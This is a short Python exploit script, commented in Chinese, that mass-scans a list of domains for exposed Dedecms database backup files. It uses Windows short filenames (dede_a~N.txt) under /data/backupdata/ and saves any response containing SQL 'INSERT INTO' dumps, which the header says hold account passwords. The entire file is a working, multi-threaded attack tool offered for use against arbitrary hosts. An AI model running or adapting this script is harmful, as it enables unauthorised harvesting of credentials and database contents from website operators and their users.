# coding:utf-8
# Dedecms 备份文件 + Apache + Windows短文件获取账号密码
# author：ske
# usage: python3 backup_exp_multi.py ipFile threadNum
# ipFile存放域名，不要http

import threading
from queue import Queue
import sys
import requests
import gevent
from gevent import monkey
monkey.patch_all()

event = threading.Event()
event.set()
q = Queue(-1)

class multi_thread(threading.Thread):
    def __init__(self,num,q):
        threading.Thread.__init__(self)
        self.num = num
        self.q = q
        self.headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36"}


    def run(self):
        while event.is_set():                                               #is_set()查看信号，由于之前设置了Flag为True，所以为真
            if self.q.empty():                                              #如果队列空了就跳出循环，终止
                event.clear()
            else:                                                           #如果队列不为空
                url = self.q.get()
                self.gev(url)

    def gev(self, url):
        threads = [gevent.spawn(self.attack, i, url) for i in range(10)]
        gevent.joinall(threads)

    def attack(self, i, url):
        try:
            url_exp = 'http://{}/data/backupdata/dede_a~{}.txt'.format(url, i)
            res = requests.get(url=url_exp, headers=self.headers, timeout=10)
            code = res.status_code
            text = res.text
            print('[*{}] [{}] -> {}'.format(self.num, code, url_exp))
            if code == 200 and 'INSERT INTO' in text:
                result = '[{}] -> {}'.format(url_exp, text)
                print('[ok] -> [{}]'.format(url_exp))
                self.save(result)
        except Exception as e:
            pass
        
    def save(self, result):
        with open('dede_backup_success.txt', 'at') as f:
            f.writelines('{}\n'.format(result))

def scan_thread():                                                         #参数是队列
    threads = []
    for num in range(1,thread_num+1):
        t = multi_thread(num,q)
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

def get_ip():
    with open(path, 'rt') as f:
        for ip in f.readlines():
            q.put(ip.strip())

if __name__ == '__main__':
    path = sys.argv[1]
    thread_num = int(sys.argv[2])
    get_ip()
    scan_thread()